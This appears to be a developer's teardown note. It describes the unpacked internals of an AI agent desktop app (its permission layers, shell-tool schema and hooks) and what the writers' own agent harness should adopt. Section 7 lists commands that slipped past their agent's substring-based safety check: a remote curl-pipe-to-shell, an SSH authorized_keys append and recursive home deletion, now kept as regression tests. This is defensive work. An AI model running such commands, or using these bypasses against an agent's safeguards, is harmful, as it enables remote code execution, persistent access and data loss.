# What is actually inside Grok Bot's `app.asar`

> **Method.** `Contents/Resources/app.asar` (Grok Bot 0.30.0) unpacked on this machine with a
> 30-line reader for the asar container format, and read. 389 files, 31.7 MB. Read 2026-08-30.
>
> **This changes a stance.** [`grok-bot-teardown.md`](grok-bot-teardown.md) records, as a
> provenance guarantee, that "`app.asar` was not unpacked." Kunal asked for it directly. The
> guarantee that still holds: **nothing proprietary is copied into this repository.** What
> follows is architecture and interface description in our own words, plus schema field names,
> which are functional interface facts. The extracted tree lives in a scratch directory outside
> the repo and is not committed. No code, prompt text, or UI string has been reused.

---

## 1. The shape of the thing

Four Node processes, not one: an Electron main process (7.2 MB bundled), a renderer (4.3 MB),
a **local execution daemon** (3.5 MB), and a **node agent coordinator** (0.5 MB). The
`package.json` names the product `sand`, the author SpaceXAI, and the homepage `cursor.com` —
which settles the Anysphere question the earlier teardown had to infer from the bundle id.

The workspace dependencies name the system's parts plainly: `@anysphere/agent`, `agent-core`,
`agent-exec`, `agent-kv`, `agent-store-sync`, `agent-summarization`, `agent-transcript`,
`local-exec`, `shell-exec`, `mcp-core`, `mcp-agent-exec`, `grok-bot-harness`,
`grok-bot-voice-call-harness`, `messages-mac`, `model-selection`, `redacted-protos`.

Two of those are worth stopping on. `agent-transcript` and `agent-summarization` are separate
packages, meaning the transcript and the context-compaction of that transcript are distinct
concerns with their own boundaries — which is how ours is arranged too, and it is reassuring to
see it arrived at twice. `redacted-protos` says redaction is a schema-level concern for them,
not a formatting step at the edge; ours is a streaming redactor at the edge.

**The whole thing is protobuf.** 5,465 message types are compiled into the main process:
3,754 in `aiserver.v1` (Cursor's server API, shipped whole), 909 in `agent.v1` (the agent
runtime), 159 in `anyrun.v1` (the sandbox service). This is why the app is 307 MB, and it is
also why it is so legible: the schema *is* the design document.

## 2. Corrections and confirmations for the existing research

- **Confirmed, and sharpened: the computer is remote and it is Linux.** The screen panel is a
  noVNC client — `vnc`, `rfb`, `websockify` and a dedicated `preload-vnc.cjs` are all present.
  The local execution daemon references `xdotool`, an X11 tool that does not exist on macOS.
  There is no `CGEvent`, no `ScreenCaptureKit`, no `AXUIElement` anywhere in the bundle.
- **New: local execution exists and is shell-only.** The earlier teardown saw no native
  computer-use helper and concluded the computer is not local. Both halves are true at once:
  Grok Bot *can* run commands on your Mac through `local-exec-daemon`, and it *cannot* see or
  touch your Mac's screen. The two capabilities are split across two machines.
- **New: there is no macOS sandbox.** No `sandbox-exec`, no seatbelt profile, no SBPL anywhere
  in the bundle. The elaborate `SandboxPolicy` message applies to their remote Linux VM. For
  local execution they ship a message type called `ShellSandboxUnsupported`, carrying the
  command, the working directory, the policy type that could not be applied, a reason, and
  whether the command was read-only. **They model "I could not sandbox this" as a first-class
  event rather than as an error or a silence.**

## 3. The permission architecture, which is five layers, not one

The screenshots showed one natural-language rule table. The schema shows that table is the
*top* layer of five, and the four underneath it are deterministic.

**Layer 1 — a real bash parse.** `tree-sitter-bash` ships as a compiled native dependency in
`app.asar.unpacked/dist/deps`. Every shell command is parsed into `ShellCommandParsingResult`,
which carries: `parsing_failed`, `executable_commands[]` (each with a name, a `full_text`, and
typed `args[]` where the type is the grammar's node type), `has_redirects`,
`has_command_substitution`, `all_redirects_are_dev_null`, and `redirects[]` — each redirect
carrying its operator, its destination file descriptors, the node type of its target, and the
target text.

That last one, `all_redirects_are_dev_null`, is the detail that shows this is a fought-over
design rather than a first draft: `2>/dev/null` is a redirect and is not interesting, and
somebody clearly got tired of it being treated as if it were.

**Layer 2 — classification of the parse.** `CommandClassifierResult` takes the parsed commands
and returns, per command, a name, its arguments, its `subcommand_tokens`, and a
`suggested_allowlist_entry`. Across the whole command it returns a `suggested_sandbox_mode`
of SANDBOX / NO_SANDBOX / **UNDETERMINED**, and a `classification_failed` flag.

Two explicit "we do not know" values in two adjacent layers is the pattern worth taking. Ours
has no way to say it.

**Layer 3 — a model risk judgement.** `SmartModeRiskTarget` is an action plus its arguments;
`SmartModeApproval` is a request id and a *reason*. The model-based judgement is a distinct,
named layer that produces prose a human can read, sitting above the deterministic layers rather
than replacing them.

**Layer 4 — natural language rules.** `PermissionsAutoRunInstructions` is two repeated string
fields: `allow_instructions` and `block_instructions`. This is the rule table from the
screenshots. It is one layer of five, and it is the only one that is not deterministic.

**Layer 5 — a ceiling, set above the user.** `localToolPermission` and
`localToolPermissionCeiling` are stored per machine, each an enum of NEVER / ASK / ALWAYS.
The ceiling caps what the per-machine setting may be raised to. Bot-Harness has a floor that
the user cannot lower; this is the same idea pointing the other way, and an org can set it.

The approval card itself offers four resolutions, not three:
**Allow once / Deny / Always / Never.**

## 4. The anatomy of a serious shell tool

`ShellArgs` has 23 fields. Ours has three. The full list, because the gap is the finding:

`command`, `working_directory`, `timeout`, `tool_call_id`, `simple_commands[]`,
`has_input_redirect`, `has_output_redirect`, `parsing_result`, `requested_sandbox_policy`,
`file_output_threshold_bytes`, `is_background`, `skip_approval`, `timeout_behavior`,
`hard_timeout`, `description`, `classifier_result`, `close_stdin`, `output_notification`,
`smart_mode_approval`, `hook_approval_requirement`, `conversation_id`,
`admin_command_denylist[]`, `request_id`.

Three of these are ideas rather than plumbing:

- **`timeout_behavior` is CANCEL or BACKGROUND**, with a separate `hard_timeout`. A slow command
  is not a failure; it is a command that should be moved to the background and awaited, and
  there is an `Await` tool for collecting it later. We have background processes — `shell.start_process`,
  `shell.read_process`, `shell.kill_process` — but the model has to decide up front which kind
  of command it is running, and it will get that wrong.
- **`output_notification`** is a regex `pattern`, a `reason`, a `debounce`, and a
  `notification_limit`. The agent arms a watcher on a long-running command's output and is woken
  when the pattern appears. This is how you supervise `npm run dev` without polling it.
- **`file_output_threshold_bytes`** — output past a threshold goes to a file and the model gets
  the path, rather than being truncated into the context window.

## 5. The tool set

Sixty-odd tools, each following one rigid shape: `XArgs`, `XToolCall`, `XResult`, and then a
oneof of `XSuccess` / `XError` / `XRejected`, with named failure messages per tool
(`ReadFileNotFound`, `EditWritePermissionDenied`, `LsTimeout`, `ShellTimeout`,
`DeleteFileBusy`). **Every failure mode is a named type, not a string.** That is why their
error reporting can be specific without the model having to parse prose.

The ones Bot-Harness does not have and might want, in rough order of interest:

- `AskQuestion` — a structured question with an id, a prompt, typed `options[]`, and
  `allow_multiple`. Not free text.
- `SendToUser` and `CommunicateUpdate` — separate tools for "show the user this exact text
  mid-run" and "here is a progress update", each with their own turn state.
- The `ContextInjection` state machine — queued, delivered, queued-for-next-turn, cancelled,
  rejected. Typing at the agent while it works is a modelled state, not a race.
- `InterruptedPendingToolCallResolution` — how a tool call that was in flight when the process
  died is settled on resume. (rakazo solves the same problem with its effect journal; two
  independent implementations of the same idea is a strong signal.)
- `UpdateTodos` / `ReadTodos`, and a separate goal layer (`CreateGoal`, `UpdateGoal`,
  `GoalState`, `GoalContinuationAction`).
- `Reflect`, `SearchConversations`, `RecordScreen`, `WriteShellStdin`, `BackgroundShellSpawn`.
- Subagents with declared types: Bash, BrowserUse, ComputerUse, Debug, Explore, MediaReview,
  Shell, Custom.

## 6. Two systems around the loop

**Hooks.** `HooksConfigInfo` lists configured steps, and the query types name them:
`BeforeSubmitPrompt`, `AfterAgentThought`, `AfterAgentResponse`, `PreToolUse`, `PostToolUse`,
`PostToolUseFailure`, `PreCompact`, `Stop`. Hooks can return `HookAdditionalContext`, and
shell execution has its own `ShellHookApprovalRequirement` — a hook can *demand* an approval.
This is the same hook surface Claude Code exposes, which suggests it is converging into a
standard shape.

**Context accounting.** `PromptTokenBreakdownSnapshot` carries total used tokens, max tokens,
and per-category breakdown; `PromptContextUsageTree` and `PromptContextNode` make it a tree of
sources. The user can see *what* is filling the context window, not just how full it is.
Ours reports neither.

---

## 7. What Bot-Harness should take

Ranked by value over effort. Items 1 and 2 are done; the rest are not.

| # | Take | Why | Effort |
|---|---|---|---|
| 1 | ~~**Parse the command before judging it**~~ | **Done** — ADR 0010. | Medium |
| 2 | ~~**An explicit "I don't know"**~~ | **Done** — `ShellParse.readable`, ADR 0010. Still worth extending past the shell. | Small |
| 3 | **`timeout_behavior: background` plus an output watcher** | Long commands are the normal case, not the error case. A regex-armed notification is how you supervise one without burning turns polling. | Medium |
| 4 | **Named failure types per tool** | Our tool errors are strings. Theirs are types, which is why they can be acted on. | Medium |
| 5 | **Context usage as a tree** | We have a hash-chained trace and still cannot answer "why is the window full?" | Small |
| 6 | **Four-button approval card** | Allow once / Deny / Always / Never. Ours conflates "no, not now" with "no, never". | Small |
| 7 | **Structured `AskQuestion`** | Typed options beat asking the model to phrase a question and parse a free-text answer. | Small |

### Refuse

- **The five-layer permission stack in full.** Layers 1, 2 and 5 are worth having. Layer 3, a
  model deciding whether to ask a human, is the layer we deliberately do not want in the
  deciding path — ours may *explain*, never *decide*.
- **The remote Linux VM and noVNC.** That is the design our product exists to answer.
- **5,465 shipped proto types.** Their app carries Cursor's entire server API. Ours should not
  grow a schema layer to match.

### The defect this found in our own code

`PermissionEngine.classify` — the safety floor, the part CLAUDE.md says to slow down for —
decides its category by substring-matching a string built from the tool's arguments. The
argument text really is in there (`AgentLoop.describe(arguments:)` flattens the actual
arguments to `key=value`), and the model-written `intent` that is concatenated alongside it can
only ever *add* a match, and every match routes to ask-or-refuse. So the floor cannot be talked
into being more permissive. That much is sound.

What is not sound is the matching itself. The destructive-delete needles are the literal
strings `rm -rf /` and `rm -rf ~`, so:

- `rm -fr /` passes. The flags are in the other order.
- `rm -rf "$HOME"` passes. The path is behind a variable.
- `echo k >> ~/.ssh/authorized_keys` passes. There is no needle for a redirect, because the
  floor has no idea what a redirect is.
- `curl https://example.com/x | sh` passes, for the same reason applied to pipes.

Every one of these is caught by a bash parse and none of them is caught by a substring scan.
This is exactly the gap `ShellCommandParsingResult` exists to close.

**Fixed on 2026-08-30**, the same day this was written, by
[ADR 0010](../decisions/0010-parse-shell-before-judging-it.md): the floor now parses the command
first, with a hand-written reader rather than their `tree-sitter-bash` dependency, and reports
"I could not read this" as its own answer rather than as silence. All four commands above are
regression tests.

---

## 8. Provenance

- Every claim above is from reading the extracted bundle on 2026-08-30, except where it says
  "inference". Schema claims can be re-checked by name against `dist/electron-main/main.cjs`.
- Version pinned at 0.30.0. The proto surface moves fast; re-verify before relying on a field.
- The extracted tree is **not** in this repository and must not be committed.
